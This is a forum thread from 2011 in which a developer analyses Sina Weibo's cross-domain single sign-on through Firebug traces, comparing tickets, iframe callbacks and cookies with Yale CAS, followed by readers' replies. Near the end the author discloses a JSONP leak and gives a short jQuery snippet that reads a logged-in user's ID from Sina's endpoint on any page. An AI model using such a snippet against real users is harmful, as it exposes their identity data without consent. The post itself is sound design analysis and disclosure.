<p><a href="http://www.iteye.com/forums/board/Java" target="_blank">全部</a> <a href="http://www.iteye.com/forums/tag/Hibernate" target="_blank">Hibernate</a> <a href="http://www.iteye.com/forums/tag/Spring" target="_blank">Spring</a> <a href="http://www.iteye.com/forums/tag/Struts" target="_blank">Struts</a> <a href="http://www.iteye.com/forums/tag/iBATIS" target="_blank">iBATIS</a> <a href="http://www.iteye.com/forums/tag/%E4%BC%81%E4%B8%9A%E5%BA%94%E7%94%A8" target="_blank">企业应用</a> <a href="http://www.iteye.com/forums/tag/Lucene" target="_blank">Lucene</a> <a href="http://www.iteye.com/forums/tag/SOA" target="_blank">SOA</a> <a href="http://www.iteye.com/forums/tag/Java%E7%BB%BC%E5%90%88" target="_blank">Java综合</a> <a href="http://www.iteye.com/forums/tag/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F" target="_blank">设计模式</a> <a href="http://www.iteye.com/forums/tag/Tomcat" target="_blank">Tomcat</a> <a href="http://www.iteye.com/forums/tag/OO" target="_blank">OO</a> <a href="http://www.iteye.com/forums/tag/JBoss" target="_blank">JBoss</a>
« 上一页 1 <a href="http://www.iteye.com/topic/1039052?page=2" target="_blank">2</a> <a href="http://www.iteye.com/topic/1039052?page=3" target="_blank">3</a> <a href="http://www.iteye.com/topic/1039052?page=2" target="_blank">下一页 »</a></p>
<p>浏览 14772 次 锁定老帖子 <a href="">主题：新浪微博如何实现 SSO 的分析</a></p>
<p><strong>该帖已经被评为精华帖</strong> 作者 正文 * denger</p>
<ul>
<li>等级: <img src="&quot;四星会员&quot;" alt="四星会员"></li>
<li><a href="http://denger.iteye.com/" target="_blank"><img src="&quot;denger的博客: Coding for fun.      &quot;" alt="denger的博客"></a></li>
<li>性别: <img src="&quot;男&quot;" alt=""></li>
<li>文章: 176</li>
<li>积分: 400</li>
<li>来自: 北京</li>
<li><img src="" alt="">
  发表时间：2011-05-10   最后修改：2011-06-25</li>
</ul>
<p><a href="http://www.iteye.com/topic/1039052#" target="_blank">&lt;</a> <a href="http://www.iteye.com/topic/1039052#" target="_blank">&gt;</a>  猎头职位: <a href="http://www.iteye.com/jobs/2245" target="_blank">上海:  【上海】外资企业高新诚聘web开发工程师</a></p>
<p>相关文章: <a href="http://www.iteye.com/topic/1039052#" title="关闭" target="_blank"> </a></p>
<ul>
<li><a href="http://www.iteye.com/topic/1111931" title="CAS 之 跨域 Ajax 登录实践" target="_blank">CAS 之 跨域 Ajax 登录实践</a></li>
<li><a href="http://www.iteye.com/topic/21770" title="跨域的单点登录" target="_blank">跨域的单点登录</a></li>
<li><p><a href="http://www.iteye.com/topic/544899" title="【原创】CAS调研总结" target="_blank">【原创】CAS调研总结</a>
推荐群组: <a href="http://liferay.group.iteye.com/" target="_blank">liferay</a>
<a href="http://www.iteye.com/wiki/topic/1039052" target="_blank">更多相关推荐</a>
<a href="http://www.iteye.com/forums/tag/%E4%BC%81%E4%B8%9A%E5%BA%94%E7%94%A8" target="_blank">企业应用</a>      最近在使用sina微博时，经常性交替使用　weibo.com 和 t.sina.cm.cn进入我的微博。发现当我在 t.sina.com.cn中登录之后，直接切换至weibo.com，这时候在 weibo.com是已经登录的，当我在 weibo.com进行注销之后，再切换至 t.sina.com.cn，这时候在 t.sina.com.cn也已经是注销的状态了。
   对于SSO的实现方案及其机制，早已经不是什么新鲜的技术了，从微软为.net提供的passport机制到java中开源的JBoss SSO、Oracle OpenSSO及经典的 Yale CAS等等之类的开源或一些商业SSO中间件都不失为作为单点登录实现的选择。当然一些企业也会选择自己实现一套适合自己轻量级方案，如采用SESSIONID转递或SESSION同步复制之类的。　可以看得出SSO的价值也是具大的，就拿sina来说吧，增加 weibo.com域名之后，对于用户来说来说没有任何影响，即使你在 t.sina.com.cn中进行登录，可以无缝在两域名之间随意切换，对于它推广weibo.com无非是大大的益处。
  由于近年来一直在使用 Yale的CAS作为SSO的方案，觉得 SINA的SSO与Yale-CAS有很多异曲同工之妙，于是便对SINA的SSO进行分析，其中的细节处理还是很值的学习的。当然，由于分析看到的SINA SSO处理都只是一些表现或表面上的东西，再加上其大部分关键的sso js都已经被压缩，及SERVER端的实现机制也只是靠自己的经验及结合CAS的的一些原理进行猜测。其实本文应该叫　<CAS SSO与SINA SSO的实现对比分析>更比较贴切。</p>
<p>  好吧，进入正题。</p>
</li>
<li><p>Sina SSO之分析篇
  首先是进入 t.sina.com.cn，提交用户名及密码进行登录，通过 Firebug可以看到它通过类似Aajx POST到了 <a href="http://login.sina.com.cn/sso/login.php?client=ssologin.js(v1.3.12)，如下图所示：" target="_blank">http://login.sina.com.cn/sso/login.php?client=ssologin.js(v1.3.12)，如下图所示：</a>
  <img src="" alt="">
  不难看出，其 <a href="http://login.sina.com.cn/sso/login.php" target="_blank">http://login.sina.com.cn/sso/login.php</a> 就是类似是 CAS 中的 Server，对sina的所有应用系统提供的统一登录入口。上面的参数中有一个service参数，了解 CAS的GG应该知道 cas 在登录的时候除了username 和 password同样也有一个 service 参数，其CAS该参数含义是子应用系统的服务名标识及登录成功之后所跳转的地址。当然，sina这里使用了 &quot;miniblog&quot;作为微博的服务名，估计他在sso-server端对 miniblog 与登录成功之后的地址进行映射，如 miniblog=<a href="http://t.sina.com.cn/，这样就避免了CAS-client中转入service=" target="_blank">http://t.sina.com.cn/，这样就避免了CAS-client中转入service=</a> decodeURIComponent(&#39;<a href="http://t.sina.com.cn&#39;)之类的做法了。" target="_blank">http://t.sina.com.cn&#39;)之类的做法了。</a>
  这里的登录与CAS做法一致，将登录验证提交至统一的认证中心进行验证处理，从而避免了跨子域和全域的问题。　验证成功之后路转的路径就是service所向的地址，验证失败之后则返回至当前登录页。下面就SSO中的一些登录方面的核心问题做一些分析，看看SINA和CAS分别是如何处理的：
   　<strong>1.如何授权某个子系统允许其在sso-server进行登录验证呢，类似cas-server中的login-ticket;</strong></p>
<pre><code>  对于cas来说，在首次进入  /cas/login页时， [会产生一个一次性的login-ticket](http://denger.iteye.com/blog/809170)，也就是说在提交登录验证前必须向服务器请求一个login-ticket，在登录提交时，需要将用户名及密码以及login-ticket进行提交至 cas-server端，cas-server端确定login-ticket有效后才会对用户名及密码进行认证。
  看看sina如何处理的吧，继续看firebug:
  ![]()       以上截图是当我首次进行 t.sina.com.cn时，通过 ajax/jsonp的方式发起的一个请求，可以看到返回的callback函数中的 json 串中包含了 nonce:&quot;SXK19N&quot;的属性，参数名的汉译是“一次”或“一次性”的意思，估计这里的 nonce就是login-ticket，为再一次确实，我再试着提交登录看看，看它是否将该参数POST过去：
 ![]()
 果然不出所料， nonce:&quot;SXK19N&quot;作为参数提交过去了，证明所猜测的应该是正确的。
</code></pre><p><strong>2.比如验证码跨域跨服务器导致从session无法获取的问题，我们曾经遇到过;</strong></p>
<pre><code>  貌似sina登录没有涉及到验证码之类的东西，当你多次登录失败之后，它采用的是“您的登录过于频繁，请稍后再试吧”，这种方案确实比验证码要好的多，而且还避免了上面的说的问题。
</code></pre><p>   <strong>3. 当我登录失败了，/sso/login.php 如何将登录的错误信息返回给 t.sina.com.cn并让它进行显示呢，如果我登录成功了/sso/login.php 通过什么方式通知t.sina.com.cn呢，因为它这里使用的是ajax方式登录？</strong></p>
<pre><code> 对于这方面，cas的处理是将错误信息以参数的方式返回给 client-login，如登录失败，重定向地址： http://cas-client.com?errocode=0，如果登录成功，则直接 重定向至 service 中的url，并生成ST给客户端，表示其已经在cas-server登录成功了。
 看看sina如何处理的吧，随便输入一个用户名密码，提交登录，继续通过firebug看看它的处理过程:
</code></pre><p><img src="&quot;点击查看原始大小图片&quot;" alt=""></p>
<pre><code>  再看看t.sina.com.cn 中的html内容的变化：
  ![]()
</code></pre><p>以上图1中发生了两次请求，第一次登录验证是访问 sso认证中心，它所返回response是一个html内容，第二次请求的地址：　<a href="http://t.sina.com.cn/ajaxlogin.php" target="_blank">http://t.sina.com.cn/ajaxlogin.php</a>　framelogin=1&amp;callback=parent.sinaSSOController.feedBackUrlCallBack&amp;retcode=4038&amp;reason=%B5%C7%C2）
再结合以上图2信息，看到 html 中发生了变化，创建了一个　id=ssoLoginFrame 的iframe，于是便可以得出，sina 的登录并非原生的ajax方式，而是通过创建iframe来模拟提交不刷新的登录。也就是说，当用户点击登录提交时，这时候它会通过js创建iframe，将登录提效至该iframe中。</p>
<pre><code>   既然已经知道它登录是提交到iframe中，而非ajax方式，那么对于以上截图1中两个请求为什么返回的都是HTML内容就很容易解释了。再回到上面的问题，/sso/login是如何通知t.sina.com.cn登录失败了呢? 首先在以上第一个截图中返回的 HTML包含了一段 javascript:
</code></pre></li>
</ul>
<p>Javascript代码  <a href="&quot;收藏这段代码&quot;"><img src="" alt="收藏代码"><img src="" alt=""></a></p>
<ol>
<li>location.replace(&quot;<a href="http://t.sina.com.cn/ajaxlogin.php?framelogin=1&amp;callback=parent.sinaSSOController.feedBackUrlCallBack&amp;retcode=4038&amp;reason=%B5%C7%C2%BC%B3%A%BC%B3%A2%CA%D4%B4%CE%CA%FD%B9%FD%D3%DA%C6%B5%B7%B1%A3%AC%C7%EB%C9%D4%BA%F3%D4%D9%B5%C7%C2%BC" target="_blank">http://t.sina.com.cn/ajaxlogin.php?framelogin=1&amp;callback=parent.sinaSSOController.feedBackUrlCallBack&amp;retcode=4038&amp;reason=%B5%C7%C2%BC%B3%A%BC%B3%A2%CA%D4%B4%CE%CA%FD%B9%FD%D3%DA%C6%B5%B7%B1%A3%AC%C7%EB%C9%D4%BA%F3%D4%D9%B5%C7%C2%BC</a>&quot;);<br>location.replace(&quot;<a href="http://t.sina.com.cn/ajaxlogin.php?framelogin=1&amp;callback=parent.sinaSSOController.feedBackUrlCallBack&amp;retcode=4038&amp;reason=%B5%C7%C2%BC%B3%A%BC%B3%A2%CA%D4%B4%CE%CA%FD%B9%FD%D3%DA%C6%B5%B7%B1%A3%AC%C7%EB%C9%D4%BA%F3%D4%D9%B5%C7%C2%BC" target="_blank">http://t.sina.com.cn/ajaxlogin.php?framelogin=1&amp;callback=parent.sinaSSOController.feedBackUrlCallBack&amp;retcode=4038&amp;reason=%B5%C7%C2%BC%B3%A%BC%B3%A2%CA%D4%B4%CE%CA%FD%B9%FD%D3%DA%C6%B5%B7%B1%A3%AC%C7%EB%C9%D4%BA%F3%D4%D9%B5%C7%C2%BC</a>&quot;);<pre><code>  location.replace的意思与location.href类似，同样都是改变当前的URL地址,具体区别及做法可以参考[这里](http://blog.csdn.net/fangxinggood/archive/2006/02/21/604916.aspx)及[这里](http://developer.apple.com/internet/webcontent/iframe.html)。需要注意的这里所说的通过location.replace改变当前的URL其它并非改变t.sina.com.cn的地址，而是第二个截图里iframe中src的地址，因为这段HTML是在iframe中输出的。
在  locaiton.replace 的地址中包含了一个 retcode 及 reason参数，估计这就是当前登录的错误信息。在上面第一个截图的第二个请求实际就是在iframe 中进行的 location.replace操作后的跳转地址。关键看它输出的html内容：
</code></pre></li>
</ol>
<p>Html代码  <a href="&quot;收藏这段代码&quot;"><img src="" alt="收藏代码"><img src="" alt=""></a></p>
<ol>
<li><html><head>  </li>
<li><script language='javascript'>  </li>
<li>parent.sinaSSOController.feedBackUrlCallBack({&quot;result&quot;:false,&quot;errno&quot;:&quot;4038&quot;,&quot;reason&quot;:&quot;\u767b\u5f55\u5c1d\u8bd5\u6b21\u6570\u8fc7\u4e8e\u9891\u7e41\uff0c\u8bf7\u7a0d\u540e\u518d\u767b\u5f55&quot;});</script></head><body></body></html>null<br><html><head> <script language='javascript'> parent.sinaSSOController.feedBackUrlCallBack({&quot;result&quot;:false,&quot;errno&quot;:&quot;4038&quot;,&quot;reason&quot;:&quot;\u767b\u5f55\u5c1d\u8bd5\u6b21\u6570\u8fc7\u4e8e\u9891\u7e41\uff0c\u8bf7\u7a0d\u540e\u518d\u767b\u5f55&quot;});</script></head><body></body></html>null
  这段js是在 iframe中执行的，所以可以通过 parent 进行访问 t.sina.com.cn中的js，可以肯定 parent.sinaSSOController.feedBackUrlCallBack 就是告诉 t.sina.com.cn 当前已经登录失败了，并且将错误信息传至该入该callback了。至此，已经完成了 /sso/login.php 对 t.sina.com.cn的信息传送。　新浪果然是有一手呀，在CAS中AJAX登录一直都是一个问题，而sina它巧妙的通过iframe+callback 进行实现了。
  接着，再看看它对于登录成功之后如何通知 t.sina.com.cn的吧，先看看登录成功之后 sina-sso-server 会做什么，看firebug截图：
   <img src="&quot;点击查看原始大小图片&quot;" alt="">
   重点在于 set-Cookie: tgc=TGT-MTc4NTc0NzM0Mw==-1305003116-ja-D51B2EB107B79FC50D8CA424BFE08907;  哈哈，熟悉CAS的应该会很熟悉这个，没想到SINA的TGT与CAS的TGT不但参数命名，居然连生成的规则也一模一样，估计sina肯定是参考了 cas 的实现机制。关于TGT是什么或其作用可以参考：<a href="http://zhenkm0507.iteye.com/blog/546805" target="_blank">CAS总结之Ticket篇</a>。另外还有一个就是当登录成功之后，sina-sso-server会将用户登陆名等等放在sina.com.cn根域的cookie中。
   然后再看看登录成功之后 sina-sso-server所返回的response内容：
   <img src="" alt="">
   以下是从以上摘取JS部分：</li>
</ol>
<p>Javascript代码  <a href="&quot;收藏这段代码&quot;"><img src="" alt="收藏代码"><img src="" alt=""></a></p>
<ol>
<li><script>  </li>
<li>try{sinaSSOController.setCrossDomainUrlList({&quot;retcode&quot;:0,&quot;arrURL&quot;:[&quot;http:\/\/weibo.com\/sso\/crosdom?action=login&amp;savestate=1305607916&quot;]});}catch(e){}try{sinaSSOController.crossDomainAction(&#39;login&#39;,function(){location.replace(&#39;<a href="http://t.sina.com.cn/ajaxlogin.php?framelogin=1&amp;callback=parent.sinaSSOController.feedBackUrlCallBack&amp;retcode=0&#39;);});}catch(e){}" target="_blank">http://t.sina.com.cn/ajaxlogin.php?framelogin=1&amp;callback=parent.sinaSSOController.feedBackUrlCallBack&amp;retcode=0&#39;);});}catch(e){}</a>  </li>
<li></script><br><script> try{sinaSSOController.setCrossDomainUrlList({&quot;retcode&quot;:0,&quot;arrURL&quot;:[&quot;http:\/\/weibo.com\/sso\/crosdom?action=login&amp;savestate=1305607916&quot;]});}catch(e){}try{sinaSSOController.crossDomainAction(&#39;login&#39;,function(){location.replace(&#39;<a href="http://t.sina.com.cn/ajaxlogin.php?framelogin=1&amp;callback=parent.sinaSSOController.feedBackUrlCallBack&amp;retcode=0&#39;);});}catch(e){}" target="_blank">http://t.sina.com.cn/ajaxlogin.php?framelogin=1&amp;callback=parent.sinaSSOController.feedBackUrlCallBack&amp;retcode=0&#39;);});}catch(e){}</a> </script>
   首先再次声明，以上firebug截图中的请求处理，并非 AJAX，而是在 t.sina.com.cn中放了一个iframe，输出的 reponse都会至iframe当中.<br>   以上的js主要重点在于:</li>
</ol>
<p>Javascript代码  <a href="&quot;收藏这段代码&quot;"><img src="" alt="收藏代码"><img src="" alt=""></a></p>
<ol>
<li>location.replace(&#39;<a href="http://t.sina.com.cn/ajaxlogin.php?framelogin=1&amp;callback=parent.sinaSSOController.feedBackUrlCallBack&amp;retcode=0" target="_blank">http://t.sina.com.cn/ajaxlogin.php?framelogin=1&amp;callback=parent.sinaSSOController.feedBackUrlCallBack&amp;retcode=0</a>&#39;)<br>location.replace(&#39;<a href="http://t.sina.com.cn/ajaxlogin.php?framelogin=1&amp;callback=parent.sinaSSOController.feedBackUrlCallBack&amp;retcode=0" target="_blank">http://t.sina.com.cn/ajaxlogin.php?framelogin=1&amp;callback=parent.sinaSSOController.feedBackUrlCallBack&amp;retcode=0</a>&#39;)
   还是通过设置当前iframe中src地址，再看看跳转至<a href="http://t.sina.com.cn/ajaxlogin.php后的response内容吧：" target="_blank">http://t.sina.com.cn/ajaxlogin.php后的response内容吧：</a>
   <img src="" alt="">
   返回用户信息(从cookie中获取的)，并且还是类似上面的做法，通过　parent.sinaSSOController.feedBackUrlCallBack回调t.sina.com.cn中的js，告诉它这个用户已经登录成功了。
   于是t.sina.com.cn便进行跳转至　t.sina.com.cn/dengers 中，从而实现登录。
   <img src="" alt="">
   整体的处理流程如下：
   <img src="" alt="">
   <strong>4. 当我在t.sina.com.cn中登录后，切换至weibo.com，weibo.com我应该也是已经登录的，如何做到呢？</strong><pre><code>对于这个问题，CAS中的处理就是，当我进入 weibo.com的时候，马上跳转至  /cas/login，然后在login中判断cookie是否存在TGT，如果存在，并确定其有效性后，则认为你已经登录，并为你生成一个ST，将ST作为ticket参数使其重定向至 weibo.com?ticket=TG-xxxx 并登录。
</code></pre>   看看sina怎么处理的吧，首先我直接在t.sina.com.cn登录成功。然后再新建一个选项卡，输入 weibo.com：
   <img src="&quot;点击查看原始大小图片&quot;" alt="">
   可以看得出，当我进入　weibo.com之后，sina并没有直接进入 weibo.com的主页，而是马上重定向至:  <a href="http://login.sina.com.cn/sso/login.php?url=http%3A%2F%2Fweibo.com%2F&amp;_rand=1305008634.5127&amp;gateway=1&amp;service=miniblog&amp;useticket=1&amp;returntype=META" target="_blank">http://login.sina.com.cn/sso/login.php?url=http%3A%2F%2Fweibo.com%2F&amp;_rand=1305008634.5127&amp;gateway=1&amp;service=miniblog&amp;useticket=1&amp;returntype=META</a> 　与cas的做法确实一致。　再看看该 login.php的Response 信息，主要是JS：</li>
</ol>
<p>Js代码  <a href="&quot;收藏这段代码&quot;"><img src="" alt="收藏代码"><img src="" alt=""></a></p>
<ol>
<li><script type="text/javascript" language="javascript">  </li>
<li>location.replace(&quot;<a href="http://weibo.com/sso/login.php?url=http%3A%2F%2Fweibo.com%2F&amp;ticket=ST-MTc4NTc0NzM0Mw==-1305008634-ja-694BA43623A3F72999AE7129A0572048&amp;retcode=0" target="_blank">http://weibo.com/sso/login.php?url=http%3A%2F%2Fweibo.com%2F&amp;ticket=ST-MTc4NTc0NzM0Mw==-1305008634-ja-694BA43623A3F72999AE7129A0572048&amp;retcode=0</a>&quot;);  </li>
<li><p></script><br><script type="text/javascript" language="javascript"> location.replace(&quot;<a href="http://weibo.com/sso/login.php?url=http%3A%2F%2Fweibo.com%2F&amp;ticket=ST-MTc4NTc0NzM0Mw==-1305008634-ja-694BA43623A3F72999AE7129A0572048&amp;retcode=0" target="_blank">http://weibo.com/sso/login.php?url=http%3A%2F%2Fweibo.com%2F&amp;ticket=ST-MTc4NTc0NzM0Mw==-1305008634-ja-694BA43623A3F72999AE7129A0572048&amp;retcode=0</a>&quot;); </script>
   看到这里之后，不得不怀疑 SINA　的 SSO　是不是用的就是 CAS　啊！！不但连 TGT 参数名一样，连ST规则及参数名也一模一样，其处理机制也十分相似。
   到这里之后就与 CAS　的处理一样了，就不详细写了，可以参考 CAS相关文章。
──────────
PS:由于在分析过程中里面的很多SSO关键JS都压缩了，所以难免会存在误差。　不过SINA的SSO很多细节方面确实处理的很好，作为互联网应用的话，如果单纯的只是把 CAS　DOWNLOAD　下来，然后直接配配就用的话很多方面的处理还是很不到位的。　有时间我把我们CAS参考 SINA　调整一下。
  到这里，不得不说的一个事情就是，之前在<a href="http://www.iteye.com/topic/1000776" target="_blank">分析淘宝cookie如何跨域获取</a>时，大家都说出了一个taobao的jsonp实际存在一定的安全隐患。后面那个淘宝的GG看到之后加入Refer的判断。而现在，在分析的过程中发现新浪也有这样的问题，可以尝试一下，随便在本地建立一个html，引入jquery，然后使用下面的JS，就可以获取到sina中的登录邮箱名等信息，前提是你需要先在sina中登录：
Js代码  <a href="&quot;收藏这段代码&quot;"><img src="" alt="收藏代码"><img src="" alt=""></a></p>
</li>
<li><p>$.ajax({url: &#39;<a href="http://t.sina.com.cn/ajaxlogin.php?framelogin=0&amp;callback=?&amp;retcode=0" target="_blank">http://t.sina.com.cn/ajaxlogin.php?framelogin=0&amp;callback=?&amp;retcode=0</a>&#39;, dataType:&#39;jsonp&#39;,  </p>
</li>
<li>success:function(data){  </li>
<li>alert(data.userinfo.userid);  </li>
<li>}});<br>$.ajax({url: &#39;<a href="http://t.sina.com.cn/ajaxlogin.php?framelogin=0&amp;callback=?&amp;retcode=0" target="_blank">http://t.sina.com.cn/ajaxlogin.php?framelogin=0&amp;callback=?&amp;retcode=0</a>&#39;, dataType:&#39;jsonp&#39;, success:function(data){ alert(data.userinfo.userid); }});</li>
</ol>
<ul>
<li><a href="http://dl.iteye.com/upload/attachment/0047/8286/31cd9585-6269-3a37-b8f4-2b8d02e4729a.png" target="_blank"><img src="&quot;点击查看原始大小图片&quot;" alt=""></a></li>
<li><p>大小: 50.6 KB</p>
</li>
<li><p><a href="http://dl.iteye.com/upload/attachment/0047/8303/e1584505-a33b-31f0-bd37-45d01091e95e.png" target="_blank"><img src="&quot;点击查看原始大小图片&quot;" alt=""></a></p>
</li>
<li><p>大小: 26.4 KB</p>
</li>
<li><p><a href="http://dl.iteye.com/upload/attachment/0047/8305/d4482ff9-9dc3-3ac5-ad7d-c7f994f30ed3.png" target="_blank"><img src="&quot;点击查看原始大小图片&quot;" alt=""></a></p>
</li>
<li><p>大小: 37.5 KB</p>
</li>
<li><p><a href="http://dl.iteye.com/upload/attachment/0047/8580/77c647c4-5c36-3dcd-910f-c90a201cfe71.png" target="_blank"><img src="&quot;点击查看原始大小图片&quot;" alt=""></a></p>
</li>
<li><p>大小: 40 KB</p>
</li>
<li><p><a href="http://dl.iteye.com/upload/attachment/0047/8597/7f3a898c-6211-3cdd-acfe-f940615a73e8.png" target="_blank"><img src="&quot;点击查看原始大小图片&quot;" alt=""></a></p>
</li>
<li><p>大小: 134.6 KB</p>
</li>
<li><p><a href="http://dl.iteye.com/upload/attachment/0047/8602/966dd896-d63f-3622-b78c-ee23370baaed.png" target="_blank"><img src="&quot;点击查看原始大小图片&quot;" alt=""></a></p>
</li>
<li><p>大小: 56 KB</p>
</li>
<li><p><a href="http://dl.iteye.com/upload/attachment/0047/8608/30cd2444-e47c-3b5c-876f-e357a5a617f3.png" target="_blank"><img src="&quot;点击查看原始大小图片&quot;" alt=""></a></p>
</li>
<li><p>大小: 29 KB</p>
</li>
<li><p><a href="http://dl.iteye.com/upload/attachment/0047/8615/ddda1c2e-b441-3e66-930f-6c06a2d2bfa1.png" target="_blank"><img src="&quot;点击查看原始大小图片&quot;" alt=""></a></p>
</li>
<li><p>大小: 35.9 KB</p>
</li>
<li><p><a href="http://dl.iteye.com/upload/attachment/0047/8620/f660b8c0-67b0-31c0-ae8c-27fa88491198.png" target="_blank"><img src="&quot;点击查看原始大小图片&quot;" alt=""></a></p>
</li>
<li><p>大小: 103.5 KB</p>
</li>
<li><p><a href="http://dl.iteye.com/upload/attachment/0047/8636/77438b2b-c573-3bba-8853-682ecdd3380d.png" target="_blank"><img src="&quot;点击查看原始大小图片&quot;" alt=""></a></p>
</li>
<li><p>大小: 110.8 KB</p>
</li>
<li><p><a href="http://dl.iteye.com/upload/attachment/0047/9000/e43d4e20-665b-342e-a693-62bd388c9597.png" target="_blank"><img src="&quot;点击查看原始大小图片&quot;" alt=""></a></p>
</li>
<li><p>大小: 134.6 KB</p>
</li>
<li><p><a href="http://dl.iteye.com/upload/attachment/0047/9002/61d8dccb-90d7-3c8e-b9c0-d58bd48c902e.png" target="_blank"><img src="&quot;点击查看原始大小图片&quot;" alt=""></a></p>
</li>
<li><p>大小: 85.2 KB</p>
</li>
<li><p><a href="http://www.iteye.com/topic/1039052#" target="_blank">查看图片附件</a></p>
</li>
</ul>
<p>声明：ITeye文章版权属于作者，受法律保护。没有作者书面许可不得转载。
推荐链接</p>
<ul>
<li><a href="http://www.iteye.com/clicks/716" target="_blank">想进外企，出国，跳槽，找工作？英语不好,快来充电吧</a></li>
<li><a href="http://www.iteye.com/clicks/609"></a></li>
<li><a href="http://www.iteye.com/clicks/770" target="_blank">世界级研发人员汇聚深圳！</a> <a href="http://www.iteye.com/topic/1039052#" target="_blank">返回顶楼</a> <a href="http://denger.iteye.com/" title="浏览作者的博客" target="_blank"> </a> <a href="http://denger.iteye.com/blog/profile" title="浏览作者资料" target="_blank"> </a> <a href="http://my.iteye.com/messages/new?message%5Breceiver_name%5D=denger" title="发送站内短信" target="_blank"> </a> <a href="http://denger.iteye.com/blog/guest_book" title="给作者留言" target="_blank"> </a> <a href="http://my.iteye.com/feed?subscription%5Bsubscribed_user_name%5D=denger" title="关注作者" target="_blank"> </a>  * 苍山洱海</li>
<li>等级: 初级会员</li>
<li><a href="http://yangkun0318-126-com.iteye.com/" target="_blank"><img src="&quot;苍山洱海的博客: &quot;" alt="苍山洱海的博客"></a></li>
<li>性别: <img src="&quot;男&quot;" alt=""></li>
<li>文章: 95</li>
<li>积分: 0</li>
<li>来自: 北京</li>
<li><img src="" alt="">
  发表时间：2011-05-10  </li>
</ul>
<p>好文章。分析的很详实。慢慢看。 <a href="http://www.iteye.com/topic/1039052#" target="_blank">返回顶楼</a> <a href="http://yangkun0318-126-com.iteye.com/" title="浏览作者的博客" target="_blank"> </a> <a href="http://yangkun0318-126-com.iteye.com/blog/profile" title="浏览作者资料" target="_blank"> </a> <a href="http://my.iteye.com/messages/new?message%5Breceiver_name%5D=%E8%8B%8D%E5%B1%B1%E6%B4%B1%E6%B5%B7" title="发送站内短信" target="_blank"> </a> <a href="http://yangkun0318-126-com.iteye.com/blog/guest_book" title="给作者留言" target="_blank"> </a> <a href="http://my.iteye.com/feed?subscription%5Bsubscribed_user_name%5D=%E8%8B%8D%E5%B1%B1%E6%B4%B1%E6%B5%B7" title="关注作者" target="_blank"> </a> <a href="http://www.iteye.com/topic/1039052#2095803" title="苍山洱海回帖:新浪微博如何实现 SSO 的分析" target="_blank">回帖地址</a></p>
<p><a href="http://www.iteye.com/topic/1039052#" title="好" target="_blank">0</a> <a href="http://www.iteye.com/topic/1039052#" title="差" target="_blank">0</a> 请登录后投票  * ln1058</p>
<ul>
<li>等级: 初级会员</li>
<li><a href="http://ln1058.iteye.com/" target="_blank"><img src="&quot;ln1058的博客: 这是一段很长很长的旅程,流尽所有的泪水永无止境,我奋力地穿越苦惘和迷墙,在我的路上寻找生命的意义... &quot;" alt="ln1058的博客"></a></li>
<li>性别: <img src="&quot;男&quot;" alt=""></li>
<li>文章: 43</li>
<li>积分: 40</li>
<li>来自: 北京</li>
<li><img src="" alt="">
  发表时间：2011-05-11  </li>
</ul>
<p>我怎么觉得没必要这么麻烦呢。
如果是我来做，直接通过cookie来判断用户是否为登录状态，然后在进行相关的URL跳转。
这种网站对于用户的安全性都不高，真有必要这么麻烦吗？ <a href="http://www.iteye.com/topic/1039052#" target="_blank">返回顶楼</a> <a href="http://ln1058.iteye.com/" title="浏览作者的博客" target="_blank"> </a> <a href="http://ln1058.iteye.com/blog/profile" title="浏览作者资料" target="_blank"> </a> <a href="http://my.iteye.com/messages/new?message%5Breceiver_name%5D=ln1058" title="发送站内短信" target="_blank"> </a> <a href="http://ln1058.iteye.com/blog/guest_book" title="给作者留言" target="_blank"> </a> <a href="http://my.iteye.com/feed?subscription%5Bsubscribed_user_name%5D=ln1058" title="关注作者" target="_blank"> </a> <a href="http://www.iteye.com/topic/1039052#2096212" title="ln1058回帖:新浪微博如何实现 SSO 的分析" target="_blank">回帖地址</a></p>
<p><a href="http://www.iteye.com/topic/1039052#" title="好" target="_blank">0</a> <a href="http://www.iteye.com/topic/1039052#" title="差" target="_blank">0</a> 请登录后投票  * denger</p>
<ul>
<li>等级: <img src="&quot;四星会员&quot;" alt="四星会员"></li>
<li><a href="http://denger.iteye.com/" target="_blank"><img src="&quot;denger的博客: Coding for fun.      &quot;" alt="denger的博客"></a></li>
<li>性别: <img src="&quot;男&quot;" alt=""></li>
<li>文章: 176</li>
<li>积分: 400</li>
<li>来自: 北京</li>
<li><img src="" alt="">
  发表时间：2011-05-11   最后修改：2011-05-11</li>
</ul>
<p>ln1058 写道</p>
<p>我怎么觉得没必要这么麻烦呢。
如果是我来做，直接通过cookie来判断用户是否为登录状态，然后在进行相关的URL跳转。
实际上说起来确实是这样，CAS和SINA也是这样的，直接从cookie判断用户是否已经登录，如果已经登录进行相关 URL的跳转。但是，cookie只会存储在一个域名下(login.sina.com.cn) ， sina很多方面都采用 AJAX/JSONP　或 iframe　的方式，因为基本上全部都是跨全域的&quot;AJAX&quot;方式登录的，所以很多地方处理起来并不是那么方便。
另外一个还要考虑的SSO的灵活和通用信，一个的系统或新的域名整合过来，增加或修改达到最少，这些在设计SSO中都是需要考虑、封装的，而sina这方面确实封装的还可以，整个SSO的处理逻辑也很清楚。他参考了CAS的设计方案或者说直接使用的就是CAS然后进行二次开发的。
引用</p>
<p>这种网站对于用户的安全性都不高，真有必要这么麻烦吗？
新浪有着上亿的微博用户噢....　就你一句话说他安全性不高，他就不高了？ <a href="http://www.iteye.com/topic/1039052#" target="_blank">返回顶楼</a> <a href="http://denger.iteye.com/" title="浏览作者的博客" target="_blank"> </a> <a href="http://denger.iteye.com/blog/profile" title="浏览作者资料" target="_blank"> </a> <a href="http://my.iteye.com/messages/new?message%5Breceiver_name%5D=denger" title="发送站内短信" target="_blank"> </a> <a href="http://denger.iteye.com/blog/guest_book" title="给作者留言" target="_blank"> </a> <a href="http://my.iteye.com/feed?subscription%5Bsubscribed_user_name%5D=denger" title="关注作者" target="_blank"> </a> <a href="http://www.iteye.com/topic/1039052#2096237" title="denger回帖:新浪微博如何实现 SSO 的分析" target="_blank">回帖地址</a></p>
<p><a href="http://www.iteye.com/topic/1039052#" title="好" target="_blank">0</a> <a href="http://www.iteye.com/topic/1039052#" title="差" target="_blank">0</a> 请登录后投票  * fangin</p>
<ul>
<li>等级: 初级会员</li>
<li><a href="http://fangin.iteye.com/" target="_blank"><img src="&quot;fangin的博客: &quot;" alt="fangin的博客"></a></li>
<li>性别: <img src="&quot;男&quot;" alt=""></li>
<li>文章: 52</li>
<li>积分: 30</li>
<li>来自: 北京</li>
<li><img src="" alt="">
  发表时间：2011-05-11  </li>
</ul>
<p>ln1058 写道</p>
